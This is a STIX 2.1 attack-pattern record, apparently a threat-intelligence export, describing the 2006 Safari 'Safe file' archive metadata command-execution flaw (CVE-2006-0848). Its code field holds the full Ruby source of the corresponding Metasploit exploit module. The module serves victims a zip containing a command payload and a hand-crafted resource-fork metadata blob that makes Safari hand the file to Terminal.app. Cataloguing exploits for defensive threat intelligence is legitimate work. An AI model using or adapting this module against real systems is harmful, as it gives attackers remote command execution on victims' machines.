{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--89787ad6-605d-4048-8238-eaee2cc5ad56",
    "created": "2024-08-14T16:34:21.814199Z",
    "modified": "2024-08-14T16:34:21.814203Z",
    "name": "Safari Archive Metadata Command Execution",
    "description": " This module exploits a vulnerability in Safari's \"Safe file\" feature, which will automatically open any file with one of the allowed extensions. This can be abused by supplying a zip file, containing a shell script, with a metafile indicating that the file should be opened by Terminal.app. This module depends on the 'zip' command-line utility.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/browser/safari_metadata_archive.rb",
            "external_id": "safari_metadata_archive.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2006-0848"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  #\n  # This module acts as an HTTP server and exploits a command execution flaw\n  #\n  include Msf::Exploit::Remote::HttpServer\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :ua_name => HttpClients::SAFARI,\n  #  :ua_maxver => '2.0.2',\n  #  :os_name => OperatingSystems::Match::MAC_OSX,\n  #  :javascript => false,\n  #  :rank => ExcellentRanking, # reliable cmd execution\n  #  :vuln_test => nil,\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Safari Archive Metadata Command Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in Safari's \"Safe file\" feature, which will\n        automatically open any file with one of the allowed extensions. This can be abused\n        by supplying a zip file, containing a shell script, with a metafile indicating\n        that the file should be opened by Terminal.app. This module depends on\n        the 'zip' command-line utility.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'hdm' ],\n      'References'     =>\n        [\n          ['CVE', '2006-0848'],\n          ['OSVDB', '23510'],\n          ['BID', '16736'],\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'BadChars' => '',\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl ruby telnet',\n            }\n        },\n      'Platform'       => %w{ unix },\n      'Targets'        =>\n        [\n          # Target 0: Automatic\n          [\n            'Automatic',\n            {\n              'Platform' => [ 'unix' ],\n              'Arch'     => ARCH_CMD,\n            },\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2006-02-21'))\n  end\n\n  def check_dependencies\n    @zip = (Rex::FileUtils::find_full_path('7za') || Rex::FileUtils::find_full_path('7za.exe'))\n    return if @zip\n    fail_with(Failure::Unknown, \"This exploit requires the zip command to be installed in your path\")\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Transmit the response to the client\n    send_response(cli, generate_zip(p), { 'Content-Type' => 'application/zip' } )\n\n    # Handle the payload\n    handler(cli)\n  end\n\n  def generate_zip(shellcode)\n    tdir  = ENV['HOME'] || ENV['TMPDIR'] || '/tmp'\n    tnam  = rand_text_alphanumeric(8)\n    tdir += '/' + tnam\n    tmov  = rand_text_alphanumeric(8) + '.mov'\n\n    FileUtils.mkdir(tdir, :mode => 0755)\n    FileUtils.cd(tdir)\n\n    fd = File.new(tmov, \"w\")\n    fd.write(shellcode.encoded)\n    fd.close\n\n    FileUtils.mkdir(tdir+'/__MACOSX', :mode => 0755)\n    fd = File.new(tdir+'/__MACOSX/._'+tmov, \"w\")\n    fd.write(generate_metadata)\n    fd.close\n\n    FileUtils.chmod(0755, tmov)\n    system(@zip, \"a\", tdir+'.zip', tmov, '__MACOSX/._'+tmov)\n\n    fd = File.new(tdir+'.zip')\n    data = fd.read(fd.stat.size)\n    fd.close\n\n    FileUtils.rm_rf(tdir)\n    FileUtils.rm_rf(tdir+'.zip')\n\n    return data\n  end\n\n  def generate_metadata\n    \"\\x00\\x05\\x16\\x07\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x09\\x00\\x00\"+\n    \"\\x00\\x32\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x52\\x00\\x00\"+\n    \"\\x05\\x3a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x05\\x08\\x00\\x00\\x04\\x08\\x00\\x00\"+\n    \"\\x00\\x32\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x04\\x04\\x00\\x00\\x00\\x25\\x2f\\x41\\x70\\x70\\x6c\\x69\"+\n    \"\\x63\\x61\\x74\\x69\\x6f\\x6e\\x73\\x2f\\x55\\x74\\x69\\x6c\\x69\\x74\\x69\\x65\"+\n    \"\\x73\\x2f\\x54\\x65\\x72\\x6d\\x69\\x6e\\x61\\x6c\\x2e\\x61\\x70\\x70\\x00\\xec\"+\n    \"\\xec\\xec\\xff\\xec\\xec\\xec\\xff\\xec\\xec\\xec\\xff\\xec\\xec\\xec\\xff\\xec\"+\n    \"\\xec\\xec\\xff\\xec\\xec\\xec\\xff\\xe1\\xe1\\xe1\\xff\\xe1\\xe1\\xe1\\xff\\xe1\"+\n    \"\\xe1\\xe1\\xff\\xe1\\xe1\\xe1\\xff\\xe1\\xe1\\xe1\\xff\\xe1\\xe1\\xe1\\xff\\xe1\"+\n    \"\\xe1\\xe1\\xff\\xe1\\xe1\\xe1\\xff\\xe6\\xe6\\xe6\\xff\\xe6\\xe6\\xe6\\xff\\xe6\"+\n    \"\\xe6\\xe6\\xff\\xe6\\xe6\\xe6\\xff\\xe6\\xe6\\xe6\\xff\\xe6\\xe6\\xe6\\xff\\xe6\"+\n    \"\\xe6\\xe6\\xff\\xe6\\xe6\\xe6\\xff\\xe9\\xe9\\xe9\\xff\\xe9\\xe9\\xe9\\xff\\xe9\"+\n    \"\\xe9\\xe9\\xff\\xe9\\xe9\\xe9\\xff\\xe9\\xe9\\xe9\\xff\\xe9\\xe9\\xe9\\xff\\xe9\"+\n    \"\\xe9\\xe9\\xff\\xe9\\xe9\\xe9\\xff\\xec\\xec\\xec\\xff\\xec\\xec\\xec\\xff\\xec\"+\n    \"\\xec\\xec\\xff\\xec\\xec\\xec\\xff\\xec\\xec\\xec\\xff\\xec\\xec\\xec\\xff\\xec\"+\n    \"\\xec\\xec\\xff\\xec\\xec\\xec\\xff\\xef\\xef\\xef\\xff\\xef\\xef\\xef\\xff\\xef\"+\n    \"\\xef\\xef\\xff\\xef\\xef\\xef\\xff\\xef\\xef\\xef\\xff\\xef\\xef\\xef\\xff\\xef\"+\n    \"\\xef\\xef\\xff\\xef\\xef\\xef\\xff\\xf3\\xf3\\xf3\\xff\\xf3\\xf3\\xf3\\xff\\xf3\"+\n    \"\\xf3\\xf3\\xff\\xf3\\xf3\\xf3\\xff\\xf3\\xf3\\xf3\\xff\\xf3\\xf3\\xf3\\xff\\xf3\"+\n    \"\\xf3\\xf3\\xff\\xf3\\xf3\\xf3\\xff\\xf6\\xf6\\xf6\\xff\\xf6\\xf6\\xf6\\xff\\xf6\"+\n    \"\\xf6\\xf6\\xff\\xf6\\xf6\\xf6\\xff\\xf6\\xf6\\xf6\\xff\\xf6\\xf6\\xf6\\xff\\xf6\"+\n    \"\\xf6\\xf6\\xff\\xf6\\xf6\\xf6\\xff\\xf8\\xf8\\xf8\\xff\\xf8\\xf8\\xf8\\xff\\xf8\"+\n    \"\\xf8\\xf8\\xff\\xf8\\xf8\\xf8\\xff\\xf8\\xf8\\xf8\\xff\\xf8\\xf8\\xf8\\xff\\xf8\"+\n    \"\\xf8\\xf8\\xff\\xf8\\xf8\\xf8\\xff\\xfc\\xfc\\xfc\\xff\\xfc\\xfc\\xfc\\xff\\xfc\"+\n    \"\\xfc\\xfc\\xff\\xfc\\xfc\\xfc\\xff\\xfc\\xfc\\xfc\\xff\\xfc\\xfc\\xfc\\xff\\xfc\"+\n    \"\\xfc\\xfc\\xff\\xfc\\xfc\\xfc\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"+\n    \"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"+\n    \"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"+\n    \"\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\\xff\"+\n    \"\\xff\\xff\\xff\\xff\\xff\\xff\\xa8\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\xa8\\x00\"+\n    \"\\x00\\x00\\xa8\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\xa8\\x00\\x00\\x00\\xa8\\x00\"+\n    \"\\x00\\x00\\xa8\\x00\\x00\\x00\\x2a\\x00\\x00\\x00\\x2a\\x00\\x00\\x00\\x2a\\x00\"+\n    \"\\x00\\x00\\x2a\\x00\\x00\\x00\\x2a\\x00\\x00\\x00\\x2a\\x00\\x00\\x00\\x2a\\x00\"+\n    \"\\x00\\x00\\x2a\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x03\\x00\"+\n    \"\\x00\\x00\\x03\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x03\\x00\"+\n    \"\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"+\n    \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\"+\n    \"\\x05\\x08\\x00\\x00\\x04\\x08\\x00\\x00\\x00\\x32\\x00\\x5f\\xd0\\xac\\x12\\xc2\"+\n    \"\\x00\\x00\\x00\\x1c\\x00\\x32\\x00\\x00\\x75\\x73\\x72\\x6f\\x00\\x00\\x00\\x0a\"+\n    \"\\x00\\x00\\xff\\xff\\x00\\x00\\x00\\x00\\x01\\x0d\\x21\\x7c\"\n  end\nend\n",
    "x_mitre_disclosure_date": "2006-02-21",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}